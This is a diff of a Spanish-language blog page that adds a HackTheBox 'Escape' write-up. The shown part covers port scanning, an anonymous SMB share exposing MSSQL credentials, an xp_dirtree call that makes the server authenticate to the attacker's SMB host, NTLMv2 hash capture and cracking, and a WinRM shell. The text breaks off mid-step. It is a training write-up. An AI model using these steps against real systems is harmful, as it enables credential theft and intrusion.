@@ -64,31 +64,31 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.1" />
-<meta property="og:title" content="EscapeWriteUp" />
+<meta property="og:title" content="Escape WriteUp" />
 <meta name="author" content="H4ckerLite" />
 <meta property="og:locale" content="es_ES" />
-<meta name="description" content="Blog de ciberseguridad, hacking, writeups, CTFs…" />
-<meta property="og:description" content="Blog de ciberseguridad, hacking, writeups, CTFs…" />
+<meta name="description" content="Máquinita Windows de hackTheBox, es de dificultad media. Ganarameos acceso al servicio MSSQL tramitando una petición a un servidor nuestro SMB obtendremos el hash NTLMv2" />
+<meta property="og:description" content="Máquinita Windows de hackTheBox, es de dificultad media. Ganarameos acceso al servicio MSSQL tramitando una petición a un servidor nuestro SMB obtendremos el hash NTLMv2" />
 <link rel="canonical" href="http://localhost:4000/posts/escape-writeup/" />
 <meta property="og:url" content="http://localhost:4000/posts/escape-writeup/" />
 <meta property="og:site_name" content="H4ckerLite Blog" />
-<meta property="og:image" content="http://localhost:4000/assets/img/commons/inject-writeup/Inject.png" />
+<meta property="og:image" content="http://localhost:4000/assets/img/commons/escape-writeup/Escape.png" />
 <meta property="og:image:alt" content="Inject WriteUp" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2023-03-20T17:00:00+01:00" />
+<meta property="article:published_time" content="2023-04-02T18:00:00+02:00" />
 <meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/inject-writeup/Inject.png" />
+<meta property="twitter:image" content="http://localhost:4000/assets/img/commons/escape-writeup/Escape.png" />
 <meta name="twitter:image:alt" content="Inject WriteUp" />
-<meta property="twitter:title" content="EscapeWriteUp" />
+<meta property="twitter:title" content="Escape WriteUp" />
 <meta name="twitter:site" content="@mortzelo" />
 <meta name="twitter:creator" content="@H4ckerLite" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-03-20T17:00:00+01:00","datePublished":"2023-03-20T17:00:00+01:00","description":"Blog de ciberseguridad, hacking, writeups, CTFs…","headline":"EscapeWriteUp","image":{"alt":"Inject WriteUp","url":"http://localhost:4000/assets/img/commons/inject-writeup/Inject.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/escape-writeup/"},"url":"http://localhost:4000/posts/escape-writeup/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"H4ckerLite"},"dateModified":"2023-04-02T18:00:00+02:00","datePublished":"2023-04-02T18:00:00+02:00","description":"Máquinita Windows de hackTheBox, es de dificultad media. Ganarameos acceso al servicio MSSQL tramitando una petición a un servidor nuestro SMB obtendremos el hash NTLMv2","headline":"Escape WriteUp","image":{"alt":"Inject WriteUp","url":"http://localhost:4000/assets/img/commons/escape-writeup/Escape.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/escape-writeup/"},"url":"http://localhost:4000/posts/escape-writeup/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>EscapeWriteUp | H4ckerLite | Blog
+  <title>Escape WriteUp | H4ckerLite | Blog
   </title>
 
   <!--
@@ -454,7 +454,7 @@
         
 
           
-            <span>EscapeWriteUp</span>
+            <span>Escape WriteUp</span>
           
 
         
@@ -625,6 +625,396 @@
     
 
   
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
+    
+
+    
+    
+    
+
+    
+    
+
+    
+    
+    
+
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+
+      
+    
+      
+      
+        
+      
+      
+
+      
+      
+
+      
+
+      
+    
+
+    
+      
+
+        <!-- Add CDN URL -->
+        
+
+        <!-- Add image path -->
+        
+
+        
+        
+
+      
+
+      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->
+
+      
+
+    
+
+    <!-- Add SVG placehoder to prevent layout reflow -->
+
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    
+
+  
 
   
 
@@ -644,9 +1034,79 @@
   
 
   
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
+
+  
 
   
   
+
+  
+    
+    
+
+    
+      
+        
+        
+      
+
+      
+      
+
+      
+      
+      
+
+      
+
+    
+
+    
 
   
 
@@ -677,7 +1137,7 @@
 
 
 
-<h1 data-toc-skip>EscapeWriteUp</h1>
+<h1 data-toc-skip>Escape WriteUp</h1>
 
 <div class="post-meta text-muted">
     <!-- published date -->
@@ -693,10 +1153,10 @@
 
 
 <em class=""
-    data-ts="1679328000"
+    data-ts="1680451200"
     data-df="YYYY-MM-DD"
     data-toggle="tooltip" data-placement="bottom">
-  2023-03-20
+  2023-04-02
 </em>
 
     </span>
@@ -708,7 +1168,7 @@
     
 
     <div class="mt-3 mb-3">
-      <img data-src="../../assets/img/commons/inject-writeup/Inject.png" class="preview-img bg"
+      <img data-src="../../assets/img/commons/escape-writeup/Escape.png" class="preview-img bg"
         alt="Inject WriteUp"
 
       
@@ -763,8 +1223,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="0 palabras">
-  <em>1 min</em> de lectura</span>
+  title="2461 palabras">
+  <em>13 min</em> de lectura</span>
 
     </div>
 
@@ -773,7 +1233,1002 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  
+  <p>Máquinita Windows de <a href="">hackTheBox</a>, es de dificultad media. Ganarameos acceso al servicio <code class="language-plaintext highlighter-rouge">MSSQL</code> tramitando una petición a un servidor nuestro <code class="language-plaintext highlighter-rouge">SMB</code> obtendremos el hash <code class="language-plaintext highlighter-rouge">NTLMv2</code></p>
+
+<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<h3 id="escaneo-de-puertos"><span class="mr-2">Escaneo de puertos</span><a href="#escaneo-de-puertos" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
+
+<p>Si realizamos un NMAO Scan, veremos los siguientes puertos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>❯❯ nmap 10.10.11.202
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-03 20:37 <span class="nt">-04</span>
+Nmap scan report <span class="k">for </span>sequel.htb <span class="o">(</span>10.10.11.202<span class="o">)</span>
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 988 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE
+53/tcp   open  domain
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+1433/tcp open  ms-sql-s
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.54 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Los puertos <strong>53</strong> y <strong>88</strong>  los que nos da a entender que es un dominio.</p>
+
+<p>Si realizamos un escanoe más profundo vemos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+</pre></td><td class="rouge-code"><pre>❯ nmap 10.10.11.202 <span class="nt">-sCV</span> <span class="nt">-Pn</span>
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-03 20:40 <span class="nt">-04</span>
+Nmap scan report <span class="k">for </span>sequel.htb <span class="o">(</span>10.10.11.202<span class="o">)</span>
+Host is up <span class="o">(</span>0.16s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 988 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2023-04-04 08:41:00Z<span class="o">)</span>
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+|_ssl-date: 2023-04-04T08:42:23+00:00<span class="p">;</span> +7h59m57s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+|_ssl-date: 2023-04-04T08:42:24+00:00<span class="p">;</span> +7h59m57s from scanner time.
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00<span class="p">;</span> RTM
+|_ssl-date: 2023-04-04T08:42:23+00:00<span class="p">;</span> +7h59m57s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2023-04-04T00:27:54
+|_Not valid after:  2053-04-04T00:27:54
+|_ms-sql-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+|_ms-sql-ntlm-info: ERROR: Script execution failed <span class="o">(</span>use <span class="nt">-d</span> to debug<span class="o">)</span>
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-04-04T08:42:23+00:00<span class="p">;</span> +7h59m57s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: sequel.htb0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: 2023-04-04T08:42:23+00:00<span class="p">;</span> +7h59m58s from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>dc.sequel.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.sequel.htb
+| Not valid before: 2022-11-18T21:20:35
+|_Not valid after:  2023-11-18T21:20:35
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m56s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2023-04-04T08:41:45
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>104.34 seconds
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Aadimos los domonios al etc/hosts</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">'10.10.11.202      sequel.htb dc.sequel.htb'</span> | <span class="nb">tee</span> <span class="nt">-a</span> /etc/hosts
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Si enumeramos con SMBCLIENT vemos lo siguiente.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>❯ smbclient <span class="nt">-L</span> 10.10.11.202 <span class="nt">-N</span>
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Public          Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</pre></td></tr></tbody></table></code></div></div>
+<ul>
+  <li>-L significa que queremos listar los archivos compartidos a nivel de sistema.</li>
+  <li>-N que queremos ver si está habilitada una Null Sesion.</li>
+</ul>
+
+<p>Como vemos el recurso <code class="language-plaintext highlighter-rouge">Public</code>procedemos a ver su contenido.</p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>❯ smbclient //10.10.11.202/Public  <span class="nt">-N</span>
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sat Nov 19 07:51:25 2022
+  ..                                  D        0  Sat Nov 19 07:51:25 2022
+  SQL Server Procedures.pdf           A    49551  Fri Nov 18 09:39:43 2022
+
+		5184255 blocks of size 4096. 1455347 blocks available
+smb: <span class="se">\&gt;</span> get <span class="s2">"SQL Server Procedures.pdf"</span>
+getting file <span class="se">\S</span>QL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf <span class="o">(</span>49,5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 49,5 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> 
+
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Si lo abrimos en nuestro navegador, v eremos lo siguiente:</p>
+
+<p><img data-src="/assets/img/commons/escape-writeup/2.png" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>PDF</em></p>
+
+<p><img data-src="/assets/img/commons/escape-writeup/3.png" alt="Hacker " class="center-image" data-proofer-ignore>
+<em>PDF</em></p>
+
+<p>Si observamos se lekea un Uuuario y su contraseña del servicio MSSQL. Nos podemos conectar.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td><td class="rouge-code"><pre>❯ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
+Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DC<span class="se">\S</span>QLMOCK<span class="o">)</span>: Line 1: Changed language setting to us_english.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>150 7208<span class="o">)</span> 
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+SQL&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+
+<h2 id="intrusión"><span class="mr-2">Intrusión</span><a href="#intrusión" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
+<p>Nos creamos un servidor SMB y le damos soporte para <code class="language-plaintext highlighter-rouge">SMBv2</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>❯ impacket-smbserver pwned  <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Usando <code class="language-plaintext highlighter-rouge">xp_dirtree</code> realizamos una petición a nuestro servidor para capturar el hash <code class="language-plaintext highlighter-rouge">NTLMv2</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>SQL&gt; xp_dirtree <span class="s1">'\\10.10.14.15\pwned'</span>
+subdirectory                                                                                                                                                                                                                                                      depth   
+</pre></td></tr></tbody></table></code></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre></td><td class="rouge-code"><pre>❯ impacket-smbserver pwned  <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.11.202,65510<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>sequel<span class="se">\s</span>ql_svc,DC<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User DC<span class="se">\s</span>ql_svc authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> sql_svc::sequel:aaaaaaaaaaaaaaaa:314ff337fa86f59b92de0736deb4049c:010100000000000080000d6d9166d901c8ab9cfbb6ab467600000000010010006d006a00500063004c00410049005900030010006d006a00500063004c0041004900590002001000780067006500580056004d007a00740004001000780067006500580056004d007a0074000700080080000d6d9166d90106000400020000000800300030000000000000000000000000300000119db20e63db55f605fba008935acc2ecdc9bceb177eedfc45245d776a2b79350a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310035000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.11.202,65510<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</pre></td></tr></tbody></table></code></div></div>
+<p>Mediante Crack de Hash, obtenemos la contraseña.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td><td class="rouge-code"><pre>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 4 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+REGGIE1234ronnie <span class="o">(</span>sql_svc<span class="o">)</span>
+1g 0:00:00:07 DONE <span class="o">(</span>2023-04-03 21:07<span class="o">)</span> 0.1303g/s 1395Kp/s 1395Kc/s 1395KC/s RENZOJAVIER..REDMAN69
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed
+</pre></td></tr></tbody></table></code></div></div>
+<p>Usando <code class="language-plaintext highlighter-rouge">rpcclient</code> podemos enumerar usuarios del dominio.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>❯ rpcclient <span class="nt">-U</span> <span class="s1">'sql_svc'</span> 10.10.11.202
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\s</span>ql_svc]:
+rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[Tom.Henn] rid:[0x44f]
+user:[Brandon.Brown] rid:[0x450]
+user:[Ryan.Cooper] rid:[0x451]
+user:[sql_svc] rid:[0x452]
+user:[James.Roberts] rid:[0x453]
+user:[Nicole.Thompson] rid:[0x454]
+rpcclient <span class="nv">$&gt;</span> 
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Nos conectamos mediante <code class="language-plaintext highlighter-rouge">Evil-WinRm</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="code-header">
+        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>❯ evil-winrm <span class="nt">-i</span> 10.10.11.202 <span class="nt">-u</span> sql_svc <span class="nt">-p</span> REGGIE1234ronnie
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\s</span>ql_svc<span class="se">\D</span>ocuments&gt; 
+</pre></td></tr></tbody></table></code></div></div>
+<p>Si vamos a la raíz de C:, vemos……</p>
+
+<p><em>Evil-WinRM</em> PS C:\Users\sql_svc\Documents&gt; cd ../../../
+<em>Evil-WinRM</em> PS C:&gt; dir</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
